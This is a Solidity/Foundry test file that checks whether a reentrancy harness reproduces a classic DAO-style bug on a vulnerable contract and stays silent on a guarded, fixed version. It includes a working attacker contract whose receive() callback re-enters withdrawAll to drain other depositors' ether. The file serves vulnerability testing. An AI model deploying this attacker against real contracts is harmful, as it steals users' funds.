// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {ReentrancyDao} from "../src/ReentrancyDao.sol";
import {ReentrancyDaoFixed} from "../src/ReentrancyDaoFixed.sol";

/// @title Differential fixture for the reentrancy harness
/// @notice Proves the harness the fallback library ships (01-reentrancy-classic)
///         actually REPRODUCES a known SmartBugs vulnerability — and, just as
///         importantly, does NOT fire against the fixed contract. That second
///         half is the precision check: a harness that "passes" on a patched
///         contract is a false positive, which is worse than a miss.
///
///         Actors are separated deliberately (attacker / victim / protocol),
///         per the Cyfrin CodeHawks PoC standard.
contract DaoAttacker {
    ReentrancyDao public immutable victim;
    uint256 public reentries;
    uint256 public maxReentries;

    constructor(address victim_) {
        victim = ReentrancyDao(victim_);
    }

    /// @dev Attacker deposits, then withdraws. The callback re-enters.
    function attack(uint256 maxReentries_) external payable {
        maxReentries = maxReentries_;
        victim.deposit{value: msg.value}();
        victim.withdrawAll();
    }

    receive() external payable {
        // Re-enter while the victim has not yet zeroed our credit.
        if (reentries < maxReentries && address(victim).balance >= 1 wei) {
            reentries += 1;
            victim.withdrawAll();
        }
    }
}

contract ReentrancyFixtureTest is Test {
    /// @dev Returns what the attacker drained out of the pool.
    function _run(ReentrancyDao dao, uint256 maxReentries) internal returns (uint256 drained, uint256 reentries) {
        // VICTIM: an unrelated depositor, so the pool holds more than the stake.
        address victimEOA = makeAddr("victimEOA");
        vm.deal(victimEOA, 10 ether);
        vm.prank(victimEOA);
        dao.deposit{value: 5 ether}();

        // ATTACKER: 1 ether stake, against a 6 ether pool.
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 10 ether);
        DaoAttacker attacker = new DaoAttacker(address(dao));

        uint256 poolBefore = address(dao).balance;
        vm.prank(attackerEOA);
        attacker.attack{value: 1 ether}(maxReentries);

        drained = poolBefore - address(dao).balance;
        reentries = attacker.reentries();
        console.log("pool before:", poolBefore);
        console.log("drained:", drained);
        console.log("re-entries:", reentries);
    }

    /// The vulnerable port: draining MORE than the 1 ether stake is the repro.
    function test_fixtureReproducesReentrancy() public {
        ReentrancyDao dao = new ReentrancyDao();
        (uint256 drained, ) = _run(dao, 5);
        assertGt(drained, 1 ether, "fixture did not reproduce: drained <= the attacker's stake");
    }

    /// The fixed contract: the same attack must NOT reproduce. The attacker
    /// DOES attempt to re-enter here — otherwise this half proves nothing.
    function test_fixtureDoesNotReproduceOnFixedContract() public {
        ReentrancyDaoFixed fixedDao = new ReentrancyDaoFixed();

        address victimEOA = makeAddr("victimEOA");
        vm.deal(victimEOA, 10 ether);
        vm.prank(victimEOA);
        fixedDao.deposit{value: 5 ether}();

        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 10 ether);
        FixedAttacker attacker = new FixedAttacker(address(fixedDao));

        uint256 poolBefore = address(fixedDao).balance;

        // Low-level call so the expected revert does not fail the test itself.
        vm.prank(attackerEOA);
        (bool ok, ) = address(attacker).call{value: 1 ether}(
            abi.encodeWithSignature("attack()")
        );

        uint256 drained = poolBefore - address(fixedDao).balance;
        console.log("fixed: attack succeeded?", ok);
        console.log("fixed: drained", drained);

        // The re-entrant withdrawal reverts on the guard, so the attacker's own
        // withdrawal reverts with it and the pool is untouched.
        assertFalse(ok, "the re-entrant withdrawal should have reverted on the guard");
        assertEq(drained, 0, "a fixed contract must not lose value to this harness");
    }
}

/// @dev The SAME attacker shape, aimed at the fixed contract: it really does try
///      to re-enter from receive(), so the guard is exercised rather than assumed.
contract FixedAttacker {
    ReentrancyDaoFixed public immutable victim;
    uint256 public reentries;

    constructor(address victim_) {
        victim = ReentrancyDaoFixed(victim_);
    }

    function attack() external payable {
        victim.deposit{value: msg.value}();
        victim.withdrawAll();
    }

    receive() external payable {
        reentries += 1;
        // Re-enter: the nonReentrant guard reverts, which bubbles up and rolls
        // the whole withdrawal back.
        victim.withdrawAll();
    }
}
